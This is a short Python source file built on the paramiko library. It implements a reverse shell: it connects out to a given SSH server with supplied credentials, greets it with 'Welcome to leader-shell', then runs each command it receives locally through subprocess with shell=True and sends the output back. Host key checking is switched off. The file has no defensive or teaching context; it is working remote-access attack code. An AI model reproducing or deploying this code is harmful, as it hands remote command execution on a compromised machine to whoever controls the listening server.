import paramiko
import subprocess
import shlex

def run_ssh_client_reverse(server_ip, user, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())


    try:
        client.connect(server_ip, username=user, password=password)
        session = client.get_transport().open_session()

        if session.active:

            session.send('Welcome to leader-shell\n')

            while True:

                command = session.recv(1024).decode()

                if command.lower() == 'exit':
                    break

                try:

                    cmd_output = subprocess.check_output(shlex.split(command), shell=True)
                    session.send(cmd_output)
                
                except Exception as e:

                    session.send(str(e).encode())

    except Exception as e:
        print(f"[-] connection error: {e}")
    
    finally:

        client.close()
